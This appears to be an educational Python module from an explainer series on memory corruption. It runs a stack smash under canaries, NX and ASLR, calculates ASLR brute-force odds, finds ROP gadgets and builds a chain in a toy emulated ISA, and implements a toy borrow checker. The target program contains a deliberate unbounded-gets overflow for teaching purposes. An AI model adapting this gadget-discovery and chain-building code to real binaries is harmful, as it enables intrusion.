"""Memory corruption and memory safety, on our own machine (Part 55, chapter 2-3).

The stack smash of Part 11 run under each defence and their combinations; the entropy of ASLR and the brute force it
costs; return-oriented programming (Shacham, *The Geometry of Innocent Flesh on the Bone*, CCS 2007) built from
gadgets discovered in a linked Pebble binary and run with W^X on; and a toy borrow checker that proves the four
things Rust's ownership rules buy (Part 14's affine types): no use-after-move, no two mutable borrows, no shared and
mutable borrow at once, and no reference outliving its owner.

Everything calls the series' own instruments: the stack smash and its defences (`explainer.cs.pebble.smash`), the
assembler/linker/emulator (`explainer.cs.pebble`).  The ROP binary here is a small program with an ordinary runtime
of helper routines; the attacker reuses their instruction tails exactly as Shacham's attack reuses libc.  Pebble is a
fixed-width ISA, so (unlike x86) there are no unaligned "unintended" gadgets: we scan aligned instruction boundaries.
"""

from __future__ import annotations

from explainer.cs.pebble import smash
from explainer.cs.pebble.emu import Machine, MachineError
from explainer.cs.pebble.isa import IO_CONSOLE, IO_TAPE, decode, disasm
from explainer.cs.pebble.link import assemble_object as _assemble_object
from explainer.cs.pebble.link import link, load

# ======================================================================================================================
# 1. The stack smash under each defence
# ======================================================================================================================

def defense_matrix() -> list[dict]:
    """Run Part 11's stack smash under every combination of {stack canary, W^X / NX}, and, for the combinations that
    turn ASLR on, the probability model of the next section.  Each cell reports the outcome:

        pwned     the injected shellcode ran and printed "pwned"
        detected  the canary changed and the epilogue aborted ("*** stack smashing detected ***")
        fault     the hardware refused (NX: execute from the stack)

    ASLR is a probabilistic defence: the fixed exploit embeds one guessed address, so it succeeds only when the guess
    is right (``success_prob``); the expected case is a wrong guess, which we run and report as the outcome.
    """
    out = []
    for canary in (False, True):
        for nx in (False, True):
            for aslr in (False, True):
                exe = smash.build(canary=canary)
                tape = smash.exploit(exe)
                if aslr:
                    # a single wrong guess: randomise the stack base by one coarse slot and keep the slot-0 payload
                    res = _run_shifted(exe, tape, nx=nx, slot=1, gran=256)
                    prob = 2.0 ** -ASLR_DEMO_BITS
                else:
                    res = smash.run(exe, tape, nx=nx)
                    prob = 1.0
                out.append({
                    "canary": canary, "nx": nx, "aslr": aslr,
                    "outcome": _classify(res),
                    "success_prob": prob,
                    "output": res["output"], "fault": res["fault"],
                })
    return out


def _classify(res: dict) -> str:
    out, fault = res["output"], res["fault"]
    if "detected" in out:
        return "detected"
    if "pwned" in out:
        return "pwned"
    if fault:
        return "fault"
    return "halted-clean"


def _run_shifted(exe, tape: bytes, nx: bool, slot: int, gran: int, limit: int = 200_000) -> dict:
    """Run with the stack base moved down by ``slot * gran`` bytes while the payload keeps its slot-0 guess."""
    mem = (1 << 20) - gran * slot
    m = load(exe, argv=["greet"], tape=tape, mem_size=mem)
    if nx:
        m = _as_nx(m)
    fault = None
    try:
        while not m.halted and m.steps < limit:
            m.step()
    except MachineError as e:
        fault = str(e)
    return {"output": bytes(m.output).decode("latin-1"), "fault": fault, "steps": m.steps, "halted": m.halted}


def _as_nx(m: Machine) -> Machine:
    m.__class__ = smash.NXMachine
    return m


# ======================================================================================================================
# 2. ASLR entropy
# ======================================================================================================================

ASLR_DEMO_BITS = 6  # the entropy of the small, runnable demonstration in aslr_experiment()


def aslr_entropy() -> dict:
    """The arithmetic of address-space layout randomisation: with ``k`` bits of entropy there are ``2^k`` equally
    likely placements, so a fixed single-address exploit hits with probability ``2^-k``.  Expected attempts to the
    first hit: ``2^k`` for independent re-randomised retries (geometric mean ``1/p``), and ``(2^k + 1)/2`` for a
    sequential sweep of all placements.

    The bit counts are the published figures for typical Linux layouts (illustrative; they depend on the kernel,
    the page size and PIE): 32-bit PaX/ASLR gives about 16 bits on the mmap base (Shacham et al., *On the
    Effectiveness of Address-Space Randomization*, CCS 2004, brute-forced in ~2^16 tries); 64-bit Linux gives on the
    order of 28-30 bits for mmap and more for the main executable under PIE.
    """
    layouts = [
        {"name": "32-bit stack (classic)", "bits": 19},
        {"name": "32-bit mmap base (PaX)", "bits": 16},
        {"name": "32-bit executable (PIE)", "bits": 8},
        {"name": "64-bit mmap base", "bits": 28},
        {"name": "64-bit PIE executable", "bits": 30},
    ]
    for L in layouts:
        k = L["bits"]
        L["placements"] = 2 ** k
        L["hit_prob"] = 2.0 ** -k
        L["expected_tries_rerandomised"] = 2 ** k
        L["expected_tries_sequential"] = (2 ** k + 1) / 2
    return {"layouts": layouts,
            "note": "hit_prob = 2^-bits; expected tries = 2^bits (re-randomised) or (2^bits+1)/2 (sequential)"}


def aslr_experiment(bits: int = ASLR_DEMO_BITS, gran: int = 256) -> dict:
    """A runnable confirmation: enumerate all ``2^bits`` placements of the stack base (spaced ``gran`` bytes apart,
    coarser than the shellcode so a miss cannot accidentally land inside it), run the fixed slot-0 exploit against
    each, and count how many pwn.  Exactly one does (the guess that matches), so the measured success rate is
    ``1/2^bits``, matching ``2^-bits``.
    """
    exe = smash.build()
    tape = smash.exploit(exe)
    n = 2 ** bits
    hits = [s for s in range(n) if "pwned" in _run_shifted(exe, tape, nx=False, slot=s, gran=gran)["output"]]
    return {"bits": bits, "placements": n, "granularity": gran,
            "hits": hits, "hit_count": len(hits),
            "measured_rate": len(hits) / n, "theoretical_rate": 2.0 ** -bits,
            "expected_tries": n}


# ======================================================================================================================
# 3. Return-oriented programming (Shacham 2007)
# ======================================================================================================================

FRAME = 80
RA_OFF = 76
CANARY_OFF = 72

# A vulnerable program with an ordinary runtime.  ``vuln`` has the Part 11 bug (an unbounded ``gets`` into a stack
# buffer); ``restore3`` and ``wb`` are mundane helper tails (restore callee-saved registers and return; store a byte
# and return) whose instruction sequences the attacker reuses as gadgets.  ``_start`` reserves a frame before calling
# ``vuln`` so the overwritten stack has room above the return address for the chain, as a real deep call stack does.


def rop_source(canary: bool = False) -> str:
    pro = (f"        la   t0, guard\n        lw   t0, 0(t0)\n        sw   t0, {CANARY_OFF}(sp)\n" if canary else "")
    epi = (f"        la   t0, guard\n        lw   t0, 0(t0)\n        lw   t1, {CANARY_OFF}(sp)\n"
           "        bne  t0, t1, smashed\n" if canary else "")
    return f"""
        .globl _start
        .text
_start: addi sp, sp, -256
        call vuln
        addi sp, sp, 256
        la   a0, bye
        call puts
        halt
vuln:   addi sp, sp, -{FRAME}
        sw   ra, {RA_OFF}(sp)
{pro}        mv   a0, sp
        call gets              # no bound: the Part 11 bug
{epi}        lw   ra, {RA_OFF}(sp)
        addi sp, sp, {FRAME}
        ret
smashed: la  a0, alarm
        call puts
        halt
# --- runtime helpers, reused as gadgets ---
restore3: lw s0, 0(sp)         # restore two callee-saved registers and return
        lw   s1, 4(sp)
        lw   ra, 8(sp)
        addi sp, sp, 12
        ret
wb:     sb   s1, 0(s0)         # store a byte, then return (restoring ra from the stack)
        lw   ra, 0(sp)
        addi sp, sp, 4
        ret
stop:   halt
# --- i/o ---
gets:   li   t1, {IO_TAPE:#x}
gnext:  lw   t2, 0(t1)
        blt  t2, zero, gend
        li   t3, 10
        beq  t2, t3, gend
        sb   t2, 0(a0)
        addi a0, a0, 1
        j    gnext
gend:   sb   zero, 0(a0)
        ret
puts:   li   t1, {IO_CONSOLE:#x}
pnext:  lbu  t2, 0(a0)
        beqz t2, pend
        sb   t2, 0(t1)
        addi a0, a0, 1
        j    pnext
pend:   ret
        .data
bye:    .asciiz "\\nbye\\n"
alarm:  .asciiz "\\n*** stack smashing detected ***\\n"
        .align 4
guard:  .word 0x5ca1ab1e
"""


def build_rop(canary: bool = False):
    """The linked ROP target binary."""
    return link([_assemble_object(rop_source(canary), "vuln.o")])


_CONTROL = {"jal", "jalr", "beq", "bne", "blt", "bge", "bltu", "bgeu", "halt"}
_TERMINATORS = ("jalr", "halt")


def find_gadgets(exe, window: int = 6) -> list[dict]:
    """Galileo-style gadget discovery (Shacham 2007), on a fixed-width ISA: scan every aligned instruction in the
    ``.text`` sections; wherever an indirect transfer (``jalr``, which includes ``ret``) or a ``halt`` sits, walk
    backwards over the straight-line instructions before it (stopping at any control transfer, or after ``window``)
    and emit that tail as a gadget.  Returns, per gadget: its address, the terminator opcode, and its disassembly.
    """
    gadgets = []
    for (_f, sec, st, sz) in exe.layout:
        if sec != ".text" or sz == 0:
            continue
        words = [int.from_bytes(exe.image[st + 4 * k:st + 4 * k + 4], "little") for k in range(sz // 4)]
        ops = []
        for w in words:
            try:
                ops.append(decode(w).op)
            except ValueError:
                ops.append(None)
        for i, op in enumerate(ops):
            if op not in _TERMINATORS:
                continue
            j = i
            while j - 1 >= 0 and ops[j - 1] not in _CONTROL and ops[j - 1] is not None and (i - (j - 1)) < window:
                j -= 1
            seq = [disasm(words[k]) for k in range(j, i + 1)]
            gadgets.append({"addr": st + 4 * j, "end": st + 4 * i, "terminator": op, "instrs": seq})
    return gadgets


_G_RESTORE3 = ["lw s0, 0(sp)", "lw s1, 4(sp)", "lw ra, 8(sp)", "addi sp, sp, 12", "jalr zero, 0(ra)"]
_G_WB = ["sb s1, 0(s0)", "lw ra, 0(sp)", "addi sp, sp, 4", "jalr zero, 0(ra)"]


def _pick(gadgets, needle):
    for g in gadgets:
        if g["instrs"] == needle:
            return g["addr"]
    raise LookupError(f"gadget not found: {needle}")


def _vuln_frame_base(exe) -> int:
    """Where ``vuln``'s buffer will sit: run on harmless input and read sp at vuln's entry."""
    m = load(exe, argv=["vuln"], tape=b"x\n")
    vuln = _assemble_object(rop_source(), "vuln.o").symbols["vuln"].offset
    while not m.halted:
        if m.pc == vuln:
            return m.regs[2] - FRAME
        m.step()
    raise RuntimeError("vuln never ran")


def build_rop_chain(exe, gadgets, word: str = "pwned") -> tuple[bytes, dict]:
    """A payload that, through gadgets only (no injected code runs), makes the program print ``word`` and halt.

    The chain alternates two discovered gadgets.  ``restore3`` loads ``s0`` (the console address), ``s1`` (the next
    byte) and a fresh return address from the stack; ``wb`` writes the byte and pops the next return address.  The
    last return goes to a ``halt``.  Only gadget addresses (code) appear in the payload, no stack addresses, which is
    exactly why stack ASLR does not stop this attack -- defeating ROP needs CFI, or code randomisation (PIE).
    """
    restore3 = _pick(gadgets, _G_RESTORE3)
    wb = _pick(gadgets, _G_WB)
    stop = next(g["addr"] for g in gadgets if g["instrs"] == ["halt"])
    chars = list(word)
    stream = []
    for idx, c in enumerate(chars):
        stream += [IO_CONSOLE, ord(c), wb, (stop if idx == len(chars) - 1 else restore3)]
    payload = bytearray(b"A" * RA_OFF)
    payload += restore3.to_bytes(4, "little")           # the overwritten return address: enter the chain
    for w in stream:
        payload += (w & 0xFFFF_FFFF).to_bytes(4, "little")
    assert b"\n" not in payload, "the payload must not contain a newline (gets stops at one)"
    return bytes(payload) + b"\n", {"restore3": restore3, "wb": wb, "stop": stop,
                                    "gadgets_used": ["restore3", "wb", "halt"], "words": len(stream),
                                    "buffer": _vuln_frame_base(exe)}


def run_rop(exe, tape: bytes, nx: bool = False, limit: int = 200_000) -> dict:
    m = load(exe, argv=["vuln"], tape=tape)
    if nx:
        m = _as_nx(m)
    fault = None
    try:
        while not m.halted and m.steps < limit:
            m.step()
    except MachineError as e:
        fault = str(e)
    return {"output": bytes(m.output).decode("latin-1"), "fault": fault, "steps": m.steps, "halted": m.halted}


def rop_demo(word: str = "pwned") -> dict:
    """Build the gadget chain and run it with W^X on (so no injected code can run) and against a canary.  With NX the
    chain still prints ``word`` and halts; the canary catches the overwrite first.
    """
    exe = build_rop()
    gadgets = find_gadgets(exe)
    tape, info = build_rop_chain(exe, gadgets, word)
    nx_res = run_rop(exe, tape, nx=True)

    exe_c = build_rop(canary=True)
    tape_c, _ = build_rop_chain(exe_c, find_gadgets(exe_c), word)
    canary_res = run_rop(exe_c, tape_c)

    sample = [g for g in gadgets if g["terminator"] == "jalr"]
    return {
        "n_gadgets": len(gadgets),
        "gadgets": [{"addr": g["addr"], "instrs": g["instrs"]} for g in sample],
        "chain": info,
        "nx": {"output": nx_res["output"], "fault": nx_res["fault"], "halted": nx_res["halted"]},
        "canary": {"output": canary_res["output"], "halted": canary_res["halted"]},
    }


# ======================================================================================================================
# 4. A toy borrow checker (Rust's ownership as affine types, Part 14)
# ======================================================================================================================

class BorrowError(Exception):
    """A program the borrow checker rejects, with the reason."""


# A tiny ownership language.  One statement per line; ``{`` and ``}`` open and close a lexical scope.
#   let x            introduce an owner x (owns a value)
#   ref r            introduce a reference slot r in this scope (assigned later)
#   x = move y       move y's value into x; y is no longer usable
#   r = & y          a shared borrow of y (many allowed, read only)
#   r = &mut y       a unique mutable borrow of y
#   use y            use the owner y (read); forbidden while y is mutably borrowed, or after it was moved
#   use r            use the reference r; forbidden once its borrow (or its referent) has ended
# A borrow lives until the end of the scope in which its reference variable is declared.

def parse_borrow(text: str) -> list:
    """Parse the ownership language into a nested block (a list of statements and sub-blocks)."""
    toks = []
    for raw in text.splitlines():
        s = raw.split("#")[0].strip()
        if s:
            toks.append(s)
    pos = 0

    def block(close: bool):
        nonlocal pos
        stmts = []
        while pos < len(toks):
            s = toks[pos]
            if s == "}":
                if not close:
                    raise BorrowError("unexpected '}'")
                pos += 1
                return stmts
            pos += 1
            if s == "{":
                stmts.append(("block", block(True)))
            else:
                stmts.append(_stmt(s))
        if close:
            raise BorrowError("missing '}'")
        return stmts

    return block(False)


def _stmt(s: str):
    if s.startswith("let "):
        return ("let", s[4:].strip())
    if s.startswith("ref "):
        return ("refdecl", s[4:].strip())
    if s.startswith("use "):
        return ("use", s[4:].strip())
    if "=" in s:
        lhs, rhs = (p.strip() for p in s.split("=", 1))
        if rhs.startswith("move "):
            return ("move", lhs, rhs[5:].strip())
        if rhs.startswith("&mut "):
            return ("borrow", lhs, "mut", rhs[5:].strip())
        if rhs.startswith("&"):
            return ("borrow", lhs, "shared", rhs[1:].strip())
        raise BorrowError(f"cannot parse right-hand side: {rhs!r}")
    raise BorrowError(f"cannot parse statement: {s!r}")


def check_borrows(text: str) -> dict:
    """Check a program.  Returns ``{"ok": True}`` or ``{"ok": False, "reason": ...}``.  The checker enforces, by a
    single walk with a scope stack:

      * use-after-move      -- using (or borrowing, or moving) an owner whose value has been moved out;
      * two mutable borrows -- a second ``&mut`` of an owner already mutably borrowed, live at once;
      * shared XOR mutable  -- a ``&`` while a ``&mut`` is live, or a ``&mut`` while any borrow is live;
      * dangling reference  -- a reference still live when the owner it points to goes out of scope.

    An owner and a reference each belong to the scope that declares them (``let``/``ref``, or first assignment for a
    reference not previously declared).  A borrow is live from the assignment ``r = & y`` until the reference's scope
    ends; when an owner's scope ends before that, the reference dangles.
    """
    prog = parse_borrow(text)
    owners: dict[str, dict] = {}    # name -> {moved}
    refs: dict[str, dict] = {}      # name -> {kind, target}  (target None: declared but unassigned)

    def live_borrows(target):
        return [(r, info) for r, info in refs.items() if info["target"] == target]

    def declare(name, scope, where):
        if name in scope["owners"] or name in scope["refs"]:
            raise BorrowError(f"{name!r} declared twice in one scope")
        scope[where].add(name)

    def walk(stmts, scope):
        for st in stmts:
            kind = st[0]
            if kind == "block":
                inner = {"owners": set(), "refs": set()}
                walk(st[1], inner)
                for r in inner["refs"]:
                    refs.pop(r, None)
                for o in inner["owners"]:
                    for rn, _info in live_borrows(o):          # the owner dies while something still points at it
                        raise BorrowError(
                            f"dangling reference {rn!r}: owner {o!r} goes out of scope while borrowed")
                    owners.pop(o, None)
            elif kind == "let":
                declare(st[1], scope, "owners")
                owners[st[1]] = {"moved": False}
            elif kind == "refdecl":
                declare(st[1], scope, "refs")
                refs[st[1]] = {"kind": None, "target": None}
            elif kind == "move":
                dst, src = st[1], st[2]
                _require_owner(owners, src)
                if owners[src]["moved"]:
                    raise BorrowError(f"use after move: {src!r} was already moved")
                if live_borrows(src):
                    raise BorrowError(f"cannot move {src!r} while it is borrowed")
                owners[src]["moved"] = True
                declare(dst, scope, "owners")
                owners[dst] = {"moved": False}
            elif kind == "borrow":
                ref, bkind, target = st[1], st[2], st[3]
                _require_owner(owners, target)
                if owners[target]["moved"]:
                    raise BorrowError(f"use after move: cannot borrow {target!r}, it was moved")
                existing = live_borrows(target)
                if bkind == "mut" and existing:
                    raise BorrowError(f"cannot take &mut {target!r}: it is already borrowed ({existing[0][1]['kind']})")
                if bkind == "shared" and any(i["kind"] == "mut" for _, i in existing):
                    raise BorrowError(f"cannot take & {target!r}: it is already mutably borrowed")
                if ref not in refs:                            # a reference not pre-declared: belongs to this scope
                    declare(ref, scope, "refs")
                refs[ref] = {"kind": bkind, "target": target}
            elif kind == "use":
                name = st[1]
                if name in refs:
                    if refs[name]["target"] is None:
                        raise BorrowError(f"use of reference {name!r} before it is assigned")
                    continue                                   # a live reference: fine
                if name not in owners:
                    raise BorrowError(f"unknown name {name!r} (undeclared, or a reference whose borrow has ended)")
                if owners[name]["moved"]:
                    raise BorrowError(f"use after move: {name!r} was moved")
                if any(i["kind"] == "mut" for _, i in live_borrows(name)):
                    raise BorrowError(f"cannot use {name!r}: it is mutably borrowed")
            else:  # pragma: no cover
                raise BorrowError(f"unknown statement {st!r}")

    try:
        walk(prog, {"owners": set(), "refs": set()})
        return {"ok": True}
    except BorrowError as e:
        return {"ok": False, "reason": str(e)}


def _require_owner(owners, name):
    if name not in owners:
        raise BorrowError(f"unknown owner {name!r}")


def borrow_examples() -> list[dict]:
    """A table of small programs and the checker's verdict (and why), for the scene."""
    cases = [
        ("move then use the source", "let x\ny = move x\nuse x", False),
        ("move then use the destination", "let x\ny = move x\nuse y", True),
        ("two mutable borrows at once", "let x\na = &mut x\nb = &mut x", False),
        ("two shared borrows at once", "let x\na = & x\nb = & x\nuse a\nuse b", True),
        ("shared and mutable together", "let x\na = & x\nb = &mut x", False),
        ("mutable borrow, then it ends, then reuse", "let x\n{\na = &mut x\n}\nb = &mut x\nuse b", True),
        ("use the owner while mutably borrowed", "let x\nr = &mut x\nuse x", False),
        ("move while borrowed", "let x\nr = & x\ny = move x", False),
        ("reference outliving its owner", "ref r\n{\nlet x\nr = &mut x\n}\nuse r", False),
        ("a borrow that stays within the owner's scope", "let x\n{\nr = & x\nuse r\n}\nuse x", True),
    ]
    out = []
    for name, src, expected in cases:
        res = check_borrows(src)
        out.append({"name": name, "program": src, "accepted": res["ok"],
                    "expected": expected, "reason": res.get("reason", "")})
    return out
